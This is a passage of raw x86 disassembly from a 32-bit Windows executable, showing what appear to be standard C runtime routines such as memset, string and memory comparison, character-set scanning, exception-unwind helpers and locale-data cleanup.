  427915:	pop    ecx
  427916:	mov    edi,eax
  427918:	cmp    edi,ebx
  42791a:	je     0x42794d
  42791c:	push   DWORD PTR [ebp-0x40]
  42791f:	push   ebx
  427920:	push   edi
  427921:	call   0x427b90
  427926:	add    esp,0xc
  427929:	mov    DWORD PTR [ebp-0x38],0x1
  427930:	push   DWORD PTR [ebp-0x40]
  427933:	push   edi
  427934:	push   DWORD PTR [ebp+0x14]
  427937:	push   DWORD PTR [ebp-0x34]
  42793a:	push   DWORD PTR [ebp+0xc]
  42793d:	push   DWORD PTR [ebp+0x8]
  427940:	call   DWORD PTR ds:0x429100
  427946:	mov    DWORD PTR [ebp-0x40],eax
  427949:	cmp    eax,ebx
  42794b:	jne    0x427951
  42794d:	xor    esi,esi
  42794f:	jmp    0x427977
  427951:	push   DWORD PTR [ebp+0x1c]
  427954:	push   DWORD PTR [ebp+0x18]
  427957:	lea    eax,[ebp-0x40]
  42795a:	push   eax
  42795b:	push   edi
  42795c:	push   DWORD PTR [ebp+0x20]
  42795f:	push   DWORD PTR [ebp-0x3c]
  427962:	call   0x428556
  427967:	add    esp,0x18
  42796a:	mov    esi,eax
  42796c:	neg    esi
  42796e:	sbb    esi,esi
  427970:	neg    esi
  427972:	jmp    0x427977
  427974:	mov    esi,DWORD PTR [ebp-0x48]
  427977:	cmp    DWORD PTR [ebp-0x38],ebx
  42797a:	je     0x42799f
  42797c:	push   edi
  42797d:	call   0x425e9a
  427982:	pop    ecx
  427983:	jmp    0x42799f
  427985:	push   DWORD PTR [ebp+0x1c]
  427988:	push   DWORD PTR [ebp+0x18]
  42798b:	push   DWORD PTR [ebp+0x14]
  42798e:	push   DWORD PTR [ebp+0x10]
  427991:	push   DWORD PTR [ebp+0xc]
  427994:	push   DWORD PTR [ebp+0x8]
  427997:	call   DWORD PTR ds:0x429100
  42799d:	mov    esi,eax
  42799f:	cmp    DWORD PTR [ebp-0x34],ebx
  4279a2:	je     0x4279ad
  4279a4:	push   DWORD PTR [ebp-0x34]
  4279a7:	call   0x425e9a
  4279ac:	pop    ecx
  4279ad:	mov    eax,esi
  4279af:	lea    esp,[ebp-0x54]
  4279b2:	call   0x4252cb
  4279b7:	ret    
  4279b8:	push   0x1c
  4279ba:	push   0x429dd0
  4279bf:	call   0x425290
  4279c4:	xor    esi,esi
  4279c6:	cmp    DWORD PTR ds:0x467380,esi
  4279cc:	jne    0x427a03
  4279ce:	lea    eax,[ebp-0x1c]
  4279d1:	push   eax
  4279d2:	xor    edi,edi
  4279d4:	inc    edi
  4279d5:	push   edi
  4279d6:	push   0x429da4
  4279db:	push   edi
  4279dc:	call   DWORD PTR ds:0x429110
  4279e2:	test   eax,eax
  4279e4:	je     0x4279ee
  4279e6:	mov    DWORD PTR ds:0x467380,edi
  4279ec:	jmp    0x427a03
  4279ee:	call   DWORD PTR ds:0x429034
  4279f4:	cmp    eax,0x78
  4279f7:	jne    0x427a03
  4279f9:	mov    DWORD PTR ds:0x467380,0x2
  427a03:	mov    eax,ds:0x467380
  427a08:	cmp    eax,0x2
  427a0b:	je     0x427afb
  427a11:	cmp    eax,esi
  427a13:	je     0x427afb
  427a19:	cmp    eax,0x1
  427a1c:	jne    0x427b21
  427a22:	mov    DWORD PTR [ebp-0x20],esi
  427a25:	mov    DWORD PTR [ebp-0x24],esi
  427a28:	cmp    DWORD PTR [ebp+0x18],esi
  427a2b:	jne    0x427a35
  427a2d:	mov    eax,ds:0x467374
  427a32:	mov    DWORD PTR [ebp+0x18],eax
  427a35:	push   esi
  427a36:	push   esi
  427a37:	push   DWORD PTR [ebp+0x10]
  427a3a:	push   DWORD PTR [ebp+0xc]
  427a3d:	xor    eax,eax
  427a3f:	cmp    DWORD PTR [ebp+0x20],esi
  427a42:	setne  al
  427a45:	lea    eax,[eax*8+0x1]
  427a4c:	push   eax
  427a4d:	push   DWORD PTR [ebp+0x18]
  427a50:	call   DWORD PTR ds:0x429104
  427a56:	mov    edi,eax
  427a58:	mov    DWORD PTR [ebp-0x28],edi
  427a5b:	test   edi,edi
  427a5d:	je     0x427b21
  427a63:	and    DWORD PTR [ebp-0x4],0x0
  427a67:	lea    ebx,[edi+edi*1]
  427a6a:	mov    eax,ebx
  427a6c:	add    eax,0x3
  427a6f:	and    eax,0xfffffffc
  427a72:	call   0x4252e0
  427a77:	mov    DWORD PTR [ebp-0x18],esp
  427a7a:	mov    esi,esp
  427a7c:	mov    DWORD PTR [ebp-0x2c],esi
  427a7f:	push   ebx
  427a80:	push   0x0
  427a82:	push   esi
  427a83:	call   0x427b90
  427a88:	add    esp,0xc
  427a8b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427a8f:	jmp    0x427aa6
  427a91:	xor    eax,eax
  427a93:	inc    eax
  427a94:	ret    
  427a95:	mov    esp,DWORD PTR [ebp-0x18]
  427a98:	call   0x428725
  427a9d:	xor    esi,esi
  427a9f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa3:	mov    edi,DWORD PTR [ebp-0x28]
  427aa6:	test   esi,esi
  427aa8:	jne    0x427ac1
  427aaa:	push   edi
  427aab:	push   0x2
  427aad:	call   0x4263a8
  427ab2:	pop    ecx
  427ab3:	pop    ecx
  427ab4:	mov    esi,eax
  427ab6:	test   esi,esi
  427ab8:	je     0x427b21
  427aba:	mov    DWORD PTR [ebp-0x24],0x1
  427ac1:	push   edi
  427ac2:	push   esi
  427ac3:	push   DWORD PTR [ebp+0x10]
  427ac6:	push   DWORD PTR [ebp+0xc]
  427ac9:	push   0x1
  427acb:	push   DWORD PTR [ebp+0x18]
  427ace:	call   DWORD PTR ds:0x429104
  427ad4:	test   eax,eax
  427ad6:	je     0x427ae9
  427ad8:	push   DWORD PTR [ebp+0x14]
  427adb:	push   eax
  427adc:	push   esi
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429110
  427ae6:	mov    DWORD PTR [ebp-0x20],eax
  427ae9:	cmp    DWORD PTR [ebp-0x24],0x0
  427aed:	je     0x427af6
  427aef:	push   esi
  427af0:	call   0x425e9a
  427af5:	pop    ecx
  427af6:	mov    eax,DWORD PTR [ebp-0x20]
  427af9:	jmp    0x427b69
  427afb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427afe:	cmp    ebx,esi
  427b00:	jne    0x427b08
  427b02:	mov    ebx,DWORD PTR ds:0x467364
  427b08:	mov    edi,DWORD PTR [ebp+0x18]
  427b0b:	test   edi,edi
  427b0d:	jne    0x427b15
  427b0f:	mov    edi,DWORD PTR ds:0x467374
  427b15:	push   ebx
  427b16:	call   0x42850d
  427b1b:	pop    ecx
  427b1c:	cmp    eax,0xffffffff
  427b1f:	jne    0x427b25
  427b21:	xor    eax,eax
  427b23:	jmp    0x427b69
  427b25:	cmp    eax,edi
  427b27:	je     0x427b47
  427b29:	push   0x0
  427b2b:	push   0x0
  427b2d:	lea    ecx,[ebp+0x10]
  427b30:	push   ecx
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   eax
  427b35:	push   edi
  427b36:	call   0x428556
  427b3b:	add    esp,0x18
  427b3e:	mov    esi,eax
  427b40:	test   esi,esi
  427b42:	je     0x427b21
  427b44:	mov    DWORD PTR [ebp+0xc],esi
  427b47:	push   DWORD PTR [ebp+0x14]
  427b4a:	push   DWORD PTR [ebp+0x10]
  427b4d:	push   DWORD PTR [ebp+0xc]
  427b50:	push   DWORD PTR [ebp+0x8]
  427b53:	push   ebx
  427b54:	call   DWORD PTR ds:0x42910c
  427b5a:	mov    edi,eax
  427b5c:	test   esi,esi
  427b5e:	je     0x427b67
  427b60:	push   esi
  427b61:	call   0x425e9a
  427b66:	pop    ecx
  427b67:	mov    eax,edi
  427b69:	lea    esp,[ebp-0x38]
  427b6c:	call   0x4252cb
  427b71:	ret    
  427b72:	mov    eax,ds:0x467384
  427b77:	test   eax,eax
  427b79:	je     0x427b8a
  427b7b:	push   DWORD PTR [esp+0x4]
  427b7f:	call   eax
  427b81:	test   eax,eax
  427b83:	pop    ecx
  427b84:	je     0x427b8a
  427b86:	xor    eax,eax
  427b88:	inc    eax
  427b89:	ret    
  427b8a:	xor    eax,eax
  427b8c:	ret    
  427b8d:	int3   
  427b8e:	int3   
  427b8f:	int3   
  427b90:	mov    edx,DWORD PTR [esp+0xc]
  427b94:	mov    ecx,DWORD PTR [esp+0x4]
  427b98:	test   edx,edx
  427b9a:	je     0x427beb
  427b9c:	xor    eax,eax
  427b9e:	mov    al,BYTE PTR [esp+0x8]
  427ba2:	push   edi
  427ba3:	mov    edi,ecx
  427ba5:	cmp    edx,0x4
  427ba8:	jb     0x427bdb
  427baa:	neg    ecx
  427bac:	and    ecx,0x3
  427baf:	je     0x427bbd
  427bb1:	sub    edx,ecx
  427bb3:	mov    BYTE PTR [edi],al
  427bb5:	add    edi,0x1
  427bb8:	sub    ecx,0x1
  427bbb:	jne    0x427bb3
  427bbd:	mov    ecx,eax
  427bbf:	shl    eax,0x8
  427bc2:	add    eax,ecx
  427bc4:	mov    ecx,eax
  427bc6:	shl    eax,0x10
  427bc9:	add    eax,ecx
  427bcb:	mov    ecx,edx
  427bcd:	and    edx,0x3
  427bd0:	shr    ecx,0x2
  427bd3:	je     0x427bdb
  427bd5:	rep stos DWORD PTR es:[edi],eax
  427bd7:	test   edx,edx
  427bd9:	je     0x427be5
  427bdb:	mov    BYTE PTR [edi],al
  427bdd:	add    edi,0x1
  427be0:	sub    edx,0x1
  427be3:	jne    0x427bdb
  427be5:	mov    eax,DWORD PTR [esp+0x8]
  427be9:	pop    edi
  427bea:	ret    
  427beb:	mov    eax,DWORD PTR [esp+0x4]
  427bef:	ret    
  427bf0:	push   esi
  427bf1:	mov    esi,DWORD PTR [esp+0x8]
  427bf5:	test   esi,esi
  427bf7:	je     0x427d7e
  427bfd:	push   DWORD PTR [esi+0x4]
  427c00:	call   0x425e9a
  427c05:	push   DWORD PTR [esi+0x8]
  427c08:	call   0x425e9a
  427c0d:	push   DWORD PTR [esi+0xc]
  427c10:	call   0x425e9a
  427c15:	push   DWORD PTR [esi+0x10]
  427c18:	call   0x425e9a
  427c1d:	push   DWORD PTR [esi+0x14]
  427c20:	call   0x425e9a
  427c25:	push   DWORD PTR [esi+0x18]
  427c28:	call   0x425e9a
  427c2d:	push   DWORD PTR [esi]
  427c2f:	call   0x425e9a
  427c34:	push   DWORD PTR [esi+0x20]
  427c37:	call   0x425e9a
  427c3c:	push   DWORD PTR [esi+0x24]
  427c3f:	call   0x425e9a
  427c44:	push   DWORD PTR [esi+0x28]
  427c47:	call   0x425e9a
  427c4c:	push   DWORD PTR [esi+0x2c]
  427c4f:	call   0x425e9a
  427c54:	push   DWORD PTR [esi+0x30]
  427c57:	call   0x425e9a
  427c5c:	push   DWORD PTR [esi+0x34]
  427c5f:	call   0x425e9a
  427c64:	push   DWORD PTR [esi+0x1c]
  427c67:	call   0x425e9a
  427c6c:	push   DWORD PTR [esi+0x38]
  427c6f:	call   0x425e9a
  427c74:	push   DWORD PTR [esi+0x3c]
  427c77:	call   0x425e9a
  427c7c:	add    esp,0x40
  427c7f:	push   DWORD PTR [esi+0x40]
  427c82:	call   0x425e9a
  427c87:	push   DWORD PTR [esi+0x44]
  427c8a:	call   0x425e9a
  427c8f:	push   DWORD PTR [esi+0x48]
  427c92:	call   0x425e9a
  427c97:	push   DWORD PTR [esi+0x4c]
  427c9a:	call   0x425e9a
  427c9f:	push   DWORD PTR [esi+0x50]
  427ca2:	call   0x425e9a
  427ca7:	push   DWORD PTR [esi+0x54]
  427caa:	call   0x425e9a
  427caf:	push   DWORD PTR [esi+0x58]
  427cb2:	call   0x425e9a
  427cb7:	push   DWORD PTR [esi+0x5c]
  427cba:	call   0x425e9a
  427cbf:	push   DWORD PTR [esi+0x60]
  427cc2:	call   0x425e9a
  427cc7:	push   DWORD PTR [esi+0x64]
  427cca:	call   0x425e9a
  427ccf:	push   DWORD PTR [esi+0x68]
  427cd2:	call   0x425e9a
  427cd7:	push   DWORD PTR [esi+0x6c]
  427cda:	call   0x425e9a
  427cdf:	push   DWORD PTR [esi+0x70]
  427ce2:	call   0x425e9a
  427ce7:	push   DWORD PTR [esi+0x74]
  427cea:	call   0x425e9a
  427cef:	push   DWORD PTR [esi+0x78]
  427cf2:	call   0x425e9a
  427cf7:	push   DWORD PTR [esi+0x7c]
  427cfa:	call   0x425e9a
  427cff:	add    esp,0x40
  427d02:	push   DWORD PTR [esi+0x80]
  427d08:	call   0x425e9a
  427d0d:	push   DWORD PTR [esi+0x84]
  427d13:	call   0x425e9a
  427d18:	push   DWORD PTR [esi+0x88]
  427d1e:	call   0x425e9a
  427d23:	push   DWORD PTR [esi+0x8c]
  427d29:	call   0x425e9a
  427d2e:	push   DWORD PTR [esi+0x90]
  427d34:	call   0x425e9a
  427d39:	push   DWORD PTR [esi+0x94]
  427d3f:	call   0x425e9a
  427d44:	push   DWORD PTR [esi+0x98]
  427d4a:	call   0x425e9a
  427d4f:	push   DWORD PTR [esi+0x9c]
  427d55:	call   0x425e9a
  427d5a:	push   DWORD PTR [esi+0xa0]
  427d60:	call   0x425e9a
  427d65:	push   DWORD PTR [esi+0xa4]
  427d6b:	call   0x425e9a
  427d70:	push   DWORD PTR [esi+0xa8]
  427d76:	call   0x425e9a
  427d7b:	add    esp,0x2c
  427d7e:	pop    esi
  427d7f:	ret    
  427d80:	push   esi
  427d81:	mov    esi,DWORD PTR [esp+0x8]
  427d85:	test   esi,esi
  427d87:	je     0x427ddd
  427d89:	mov    eax,DWORD PTR [esi]
  427d8b:	mov    ecx,DWORD PTR ds:0x466ef4
  427d91:	cmp    eax,DWORD PTR [ecx]
  427d93:	je     0x427da4
  427d95:	cmp    eax,DWORD PTR ds:0x466ec4
  427d9b:	je     0x427da4
  427d9d:	push   eax
  427d9e:	call   0x425e9a
  427da3:	pop    ecx
  427da4:	mov    eax,DWORD PTR [esi+0x4]
  427da7:	mov    ecx,DWORD PTR ds:0x466ef4
  427dad:	cmp    eax,DWORD PTR [ecx+0x4]
  427db0:	je     0x427dc1
  427db2:	cmp    eax,DWORD PTR ds:0x466ec8
  427db8:	je     0x427dc1
  427dba:	push   eax
  427dbb:	call   0x425e9a
  427dc0:	pop    ecx
  427dc1:	mov    esi,DWORD PTR [esi+0x8]
  427dc4:	mov    eax,ds:0x466ef4
  427dc9:	cmp    esi,DWORD PTR [eax+0x8]
  427dcc:	je     0x427ddd
  427dce:	cmp    esi,DWORD PTR ds:0x466ecc
  427dd4:	je     0x427ddd
  427dd6:	push   esi
  427dd7:	call   0x425e9a
  427ddc:	pop    ecx
  427ddd:	pop    esi
  427dde:	ret    
  427ddf:	push   esi
  427de0:	mov    esi,DWORD PTR [esp+0x8]
  427de4:	test   esi,esi
  427de6:	je     0x427eb6
  427dec:	mov    eax,DWORD PTR [esi+0xc]
  427def:	mov    ecx,DWORD PTR ds:0x466ef4
  427df5:	cmp    eax,DWORD PTR [ecx+0xc]
  427df8:	je     0x427e09
  427dfa:	cmp    eax,DWORD PTR ds:0x466ed0
  427e00:	je     0x427e09
  427e02:	push   eax
  427e03:	call   0x425e9a
  427e08:	pop    ecx
  427e09:	mov    eax,DWORD PTR [esi+0x10]
  427e0c:	mov    ecx,DWORD PTR ds:0x466ef4
  427e12:	cmp    eax,DWORD PTR [ecx+0x10]
  427e15:	je     0x427e26
  427e17:	cmp    eax,DWORD PTR ds:0x466ed4
  427e1d:	je     0x427e26
  427e1f:	push   eax
  427e20:	call   0x425e9a
  427e25:	pop    ecx
  427e26:	mov    eax,DWORD PTR [esi+0x14]
  427e29:	mov    ecx,DWORD PTR ds:0x466ef4
  427e2f:	cmp    eax,DWORD PTR [ecx+0x14]
  427e32:	je     0x427e43
  427e34:	cmp    eax,DWORD PTR ds:0x466ed8
  427e3a:	je     0x427e43
  427e3c:	push   eax
  427e3d:	call   0x425e9a
  427e42:	pop    ecx
  427e43:	mov    eax,DWORD PTR [esi+0x18]
  427e46:	mov    ecx,DWORD PTR ds:0x466ef4
  427e4c:	cmp    eax,DWORD PTR [ecx+0x18]
  427e4f:	je     0x427e60
  427e51:	cmp    eax,DWORD PTR ds:0x466edc
  427e57:	je     0x427e60
  427e59:	push   eax
  427e5a:	call   0x425e9a
  427e5f:	pop    ecx
  427e60:	mov    eax,DWORD PTR [esi+0x1c]
  427e63:	mov    ecx,DWORD PTR ds:0x466ef4
  427e69:	cmp    eax,DWORD PTR [ecx+0x1c]
  427e6c:	je     0x427e7d
  427e6e:	cmp    eax,DWORD PTR ds:0x466ee0
  427e74:	je     0x427e7d
  427e76:	push   eax
  427e77:	call   0x425e9a
  427e7c:	pop    ecx
  427e7d:	mov    eax,DWORD PTR [esi+0x20]
  427e80:	mov    ecx,DWORD PTR ds:0x466ef4
  427e86:	cmp    eax,DWORD PTR [ecx+0x20]
  427e89:	je     0x427e9a
  427e8b:	cmp    eax,DWORD PTR ds:0x466ee4
  427e91:	je     0x427e9a
  427e93:	push   eax
  427e94:	call   0x425e9a
  427e99:	pop    ecx
  427e9a:	mov    esi,DWORD PTR [esi+0x24]
  427e9d:	mov    eax,ds:0x466ef4
  427ea2:	cmp    esi,DWORD PTR [eax+0x24]
  427ea5:	je     0x427eb6
  427ea7:	cmp    esi,DWORD PTR ds:0x466ee8
  427ead:	je     0x427eb6
  427eaf:	push   esi
  427eb0:	call   0x425e9a
  427eb5:	pop    ecx
  427eb6:	pop    esi
  427eb7:	ret    
  427eb8:	int3   
  427eb9:	int3   
  427eba:	int3   
  427ebb:	int3   
  427ebc:	int3   
  427ebd:	int3   
  427ebe:	int3   
  427ebf:	int3   
  427ec0:	push   ebp
  427ec1:	mov    ebp,esp
  427ec3:	push   esi
  427ec4:	xor    eax,eax
  427ec6:	push   eax
  427ec7:	push   eax
  427ec8:	push   eax
  427ec9:	push   eax
  427eca:	push   eax
  427ecb:	push   eax
  427ecc:	push   eax
  427ecd:	push   eax
  427ece:	mov    edx,DWORD PTR [ebp+0xc]
  427ed1:	lea    ecx,[ecx+0x0]
  427ed4:	mov    al,BYTE PTR [edx]
  427ed6:	or     al,al
  427ed8:	je     0x427ee3
  427eda:	add    edx,0x1
  427edd:	bts    DWORD PTR [esp],eax
  427ee1:	jmp    0x427ed4
  427ee3:	mov    esi,DWORD PTR [ebp+0x8]
  427ee6:	or     ecx,0xffffffff
  427ee9:	lea    ecx,[ecx+0x0]
  427eec:	add    ecx,0x1
  427eef:	mov    al,BYTE PTR [esi]
  427ef1:	or     al,al
  427ef3:	je     0x427efe
  427ef5:	add    esi,0x1
  427ef8:	bt     DWORD PTR [esp],eax
  427efc:	jae    0x427eec
  427efe:	mov    eax,ecx
  427f00:	add    esp,0x20
  427f03:	pop    esi
  427f04:	leave  
  427f05:	ret    
  427f06:	int3   
  427f07:	int3   
  427f08:	int3   
  427f09:	int3   
  427f0a:	int3   
  427f0b:	int3   
  427f0c:	int3   
  427f0d:	int3   
  427f0e:	int3   
  427f0f:	int3   
  427f10:	mov    edx,DWORD PTR [esp+0x4]
  427f14:	mov    ecx,DWORD PTR [esp+0x8]
  427f18:	test   edx,0x3
  427f1e:	jne    0x427f5c
  427f20:	mov    eax,DWORD PTR [edx]
  427f22:	cmp    al,BYTE PTR [ecx]
  427f24:	jne    0x427f54
  427f26:	or     al,al
  427f28:	je     0x427f50
  427f2a:	cmp    ah,BYTE PTR [ecx+0x1]
  427f2d:	jne    0x427f54
  427f2f:	or     ah,ah
  427f31:	je     0x427f50
  427f33:	shr    eax,0x10
  427f36:	cmp    al,BYTE PTR [ecx+0x2]
  427f39:	jne    0x427f54
  427f3b:	or     al,al
  427f3d:	je     0x427f50
  427f3f:	cmp    ah,BYTE PTR [ecx+0x3]
  427f42:	jne    0x427f54
  427f44:	add    ecx,0x4
  427f47:	add    edx,0x4
  427f4a:	or     ah,ah
  427f4c:	jne    0x427f20
  427f4e:	mov    edi,edi
  427f50:	xor    eax,eax
  427f52:	ret    
  427f53:	nop
  427f54:	sbb    eax,eax
  427f56:	shl    eax,1
  427f58:	add    eax,0x1
  427f5b:	ret    
  427f5c:	test   edx,0x1
  427f62:	je     0x427f7c
  427f64:	mov    al,BYTE PTR [edx]
  427f66:	add    edx,0x1
  427f69:	cmp    al,BYTE PTR [ecx]
  427f6b:	jne    0x427f54
  427f6d:	add    ecx,0x1
  427f70:	or     al,al
  427f72:	je     0x427f50
  427f74:	test   edx,0x2
  427f7a:	je     0x427f20
  427f7c:	mov    ax,WORD PTR [edx]
  427f7f:	add    edx,0x2
  427f82:	cmp    al,BYTE PTR [ecx]
  427f84:	jne    0x427f54
  427f86:	or     al,al
  427f88:	je     0x427f50
  427f8a:	cmp    ah,BYTE PTR [ecx+0x1]
  427f8d:	jne    0x427f54
  427f8f:	or     ah,ah
  427f91:	je     0x427f50
  427f93:	add    ecx,0x2
  427f96:	jmp    0x427f20
  427f98:	int3   
  427f99:	int3   
  427f9a:	int3   
  427f9b:	int3   
  427f9c:	int3   
  427f9d:	int3   
  427f9e:	int3   
  427f9f:	int3   
  427fa0:	mov    eax,DWORD PTR [esp+0xc]
  427fa4:	test   eax,eax
  427fa6:	je     0x427ff2
  427fa8:	mov    edx,DWORD PTR [esp+0x4]
  427fac:	push   esi
  427fad:	push   edi
  427fae:	mov    esi,edx
  427fb0:	mov    edi,DWORD PTR [esp+0x10]
  427fb4:	or     edx,edi
  427fb6:	and    edx,0x3
  427fb9:	je     0x427ff3
  427fbb:	test   eax,0x1
  427fc0:	je     0x427fd3
  427fc2:	mov    cl,BYTE PTR [esi]
  427fc4:	cmp    cl,BYTE PTR [edi]
  427fc6:	jne    0x428020
  427fc8:	add    esi,0x1
  427fcb:	add    edi,0x1
  427fce:	sub    eax,0x1
  427fd1:	je     0x427ff0
  427fd3:	mov    cl,BYTE PTR [esi]
  427fd5:	mov    dl,BYTE PTR [edi]
  427fd7:	cmp    cl,dl
  427fd9:	jne    0x428020
  427fdb:	mov    cl,BYTE PTR [esi+0x1]
  427fde:	mov    dl,BYTE PTR [edi+0x1]
  427fe1:	cmp    cl,dl
  427fe3:	jne    0x428020
  427fe5:	add    edi,0x2
  427fe8:	add    esi,0x2
  427feb:	sub    eax,0x2
  427fee:	jne    0x427fd3
  427ff0:	pop    edi
  427ff1:	pop    esi
  427ff2:	ret    
  427ff3:	mov    ecx,eax
  427ff5:	and    eax,0x3
  427ff8:	shr    ecx,0x2
  427ffb:	je     0x428028
  427ffd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fff:	je     0x428028
  428001:	mov    ecx,DWORD PTR [esi-0x4]
  428004:	mov    edx,DWORD PTR [edi-0x4]
  428007:	cmp    cl,dl
  428009:	jne    0x42801b
  42800b:	cmp    ch,dh
  42800d:	jne    0x42801b
  42800f:	shr    ecx,0x10
  428012:	shr    edx,0x10
  428015:	cmp    cl,dl
  428017:	jne    0x42801b
  428019:	cmp    ch,dh
  42801b:	mov    eax,0x0
  428020:	sbb    eax,eax
  428022:	pop    edi
  428023:	sbb    eax,0xffffffff
  428026:	pop    esi
  428027:	ret    
  428028:	test   eax,eax
  42802a:	je     0x427ff0
  42802c:	mov    edx,DWORD PTR [esi]
  42802e:	mov    ecx,DWORD PTR [edi]
  428030:	cmp    dl,cl
  428032:	jne    0x42801b
  428034:	sub    eax,0x1
  428037:	je     0x428055
  428039:	cmp    dh,ch
  42803b:	jne    0x42801b
  42803d:	sub    eax,0x1
  428040:	je     0x428055
  428042:	and    ecx,0xff0000
  428048:	and    edx,0xff0000
  42804e:	cmp    edx,ecx
  428050:	jne    0x42801b
  428052:	sub    eax,0x1
  428055:	pop    edi
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   edi
  428064:	push   esi
  428065:	push   ebx
  428066:	mov    ecx,DWORD PTR [ebp+0x10]
  428069:	jecxz  0x428092
  42806b:	mov    ebx,ecx
  42806d:	mov    edi,DWORD PTR [ebp+0x8]
  428070:	mov    esi,edi
  428072:	xor    eax,eax
  428074:	repnz scas al,BYTE PTR es:[edi]
  428076:	neg    ecx
  428078:	add    ecx,ebx
  42807a:	mov    edi,esi
  42807c:	mov    esi,DWORD PTR [ebp+0xc]
  42807f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428081:	mov    al,BYTE PTR [esi-0x1]
  428084:	xor    ecx,ecx
  428086:	cmp    al,BYTE PTR [edi-0x1]
  428089:	ja     0x428090
  42808b:	je     0x428092
  42808d:	sub    ecx,0x2
  428090:	not    ecx
  428092:	mov    eax,ecx
  428094:	pop    ebx
  428095:	pop    esi
  428096:	pop    edi
  428097:	leave  
  428098:	ret    
  428099:	int3   
  42809a:	int3   
  42809b:	int3   
  42809c:	int3   
  42809d:	int3   
  42809e:	int3   
  42809f:	int3   
  4280a0:	push   ebp
  4280a1:	mov    ebp,esp
  4280a3:	push   esi
  4280a4:	xor    eax,eax
  4280a6:	push   eax
  4280a7:	push   eax
  4280a8:	push   eax
  4280a9:	push   eax
  4280aa:	push   eax
  4280ab:	push   eax
  4280ac:	push   eax
  4280ad:	push   eax
  4280ae:	mov    edx,DWORD PTR [ebp+0xc]
  4280b1:	lea    ecx,[ecx+0x0]
  4280b4:	mov    al,BYTE PTR [edx]
  4280b6:	or     al,al
  4280b8:	je     0x4280c3
  4280ba:	add    edx,0x1
  4280bd:	bts    DWORD PTR [esp],eax
  4280c1:	jmp    0x4280b4
  4280c3:	mov    esi,DWORD PTR [ebp+0x8]
  4280c6:	mov    edi,edi
  4280c8:	mov    al,BYTE PTR [esi]
  4280ca:	or     al,al
  4280cc:	je     0x4280da
  4280ce:	add    esi,0x1
  4280d1:	bt     DWORD PTR [esp],eax
  4280d5:	jae    0x4280c8
  4280d7:	lea    eax,[esi-0x1]
  4280da:	add    esp,0x20
  4280dd:	pop    esi
  4280de:	leave  
  4280df:	ret    
  4280e0:	push   ebp
  4280e1:	mov    ebp,esp
  4280e3:	push   ebx
  4280e4:	push   esi
  4280e5:	push   edi
  4280e6:	push   ebp
  4280e7:	push   0x0
  4280e9:	push   0x0
  4280eb:	push   0x4280f8
  4280f0:	push   DWORD PTR [ebp+0x8]
  4280f3:	call   0x428b6e
  4280f8:	pop    ebp
  4280f9:	pop    edi
  4280fa:	pop    esi
  4280fb:	pop    ebx
  4280fc:	mov    esp,ebp
  4280fe:	pop    ebp
  4280ff:	ret    
  428100:	mov    ecx,DWORD PTR [esp+0x4]
  428104:	test   DWORD PTR [ecx+0x4],0x6
  42810b:	mov    eax,0x1
  428110:	je     0x428121
  428112:	mov    eax,DWORD PTR [esp+0x8]
  428116:	mov    edx,DWORD PTR [esp+0x10]
  42811a:	mov    DWORD PTR [edx],eax
  42811c:	mov    eax,0x3
  428121:	ret    
  428122:	push   ebx
  428123:	push   esi
  428124:	push   edi
  428125:	mov    eax,DWORD PTR [esp+0x10]
  428129:	push   eax
  42812a:	push   0xfffffffe
  42812c:	push   0x428100
  428131:	push   DWORD PTR fs:0x0
  428138:	mov    DWORD PTR fs:0x0,esp
  42813f:	mov    eax,DWORD PTR [esp+0x20]
  428143:	mov    ebx,DWORD PTR [eax+0x8]
  428146:	mov    esi,DWORD PTR [eax+0xc]
  428149:	cmp    esi,0xffffffff
  42814c:	je     0x42817c
  42814e:	cmp    esi,DWORD PTR [esp+0x24]
  428152:	je     0x42817c
  428154:	lea    esi,[esi+esi*2]
  428157:	mov    ecx,DWORD PTR [ebx+esi*4]
  42815a:	mov    DWORD PTR [esp+0x8],ecx
  42815e:	mov    DWORD PTR [eax+0xc],ecx
  428161:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428166:	jne    0x42817a
  428168:	push   0x101
  42816d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428171:	call   0x4281b6
  428176:	call   DWORD PTR [ebx+esi*4+0x8]
  42817a:	jmp    0x42813f
  42817c:	pop    DWORD PTR fs:0x0
  428183:	add    esp,0xc
  428186:	pop    edi
  428187:	pop    esi
  428188:	pop    ebx
  428189:	ret    
  42818a:	xor    eax,eax
  42818c:	mov    ecx,DWORD PTR fs:0x0
  428193:	cmp    DWORD PTR [ecx+0x4],0x428100
  42819a:	jne    0x4281ac
  42819c:	mov    edx,DWORD PTR [ecx+0xc]
  42819f:	mov    edx,DWORD PTR [edx+0xc]
  4281a2:	cmp    DWORD PTR [ecx+0x8],edx
  4281a5:	jne    0x4281ac
  4281a7:	mov    eax,0x1
  4281ac:	ret    
  4281ad:	push   ebx
  4281ae:	push   ecx
  4281af:	mov    ebx,0x466f0c
  4281b4:	jmp    0x4281c0
  4281b6:	push   ebx
  4281b7:	push   ecx
  4281b8:	mov    ebx,0x466f0c
  4281bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4281c0:	mov    DWORD PTR [ebx+0x8],ecx
  4281c3:	mov    DWORD PTR [ebx+0x4],eax
  4281c6:	mov    DWORD PTR [ebx+0xc],ebp
  4281c9:	pop    ecx
  4281ca:	pop    ebx
  4281cb:	ret    0x4
  4281ce:	int3   
  4281cf:	int3   
  4281d0:	push   ebp
  4281d1:	mov    ebp,esp
  4281d3:	push   edi
  4281d4:	push   esi
  4281d5:	mov    esi,DWORD PTR [ebp+0xc]
  4281d8:	mov    ecx,DWORD PTR [ebp+0x10]
  4281db:	mov    edi,DWORD PTR [ebp+0x8]
  4281de:	mov    eax,ecx
  4281e0:	mov    edx,ecx
  4281e2:	add    eax,esi
  4281e4:	cmp    edi,esi
  4281e6:	jbe    0x4281f0
  4281e8:	cmp    edi,eax
  4281ea:	jb     0x42836c
  4281f0:	test   edi,0x3
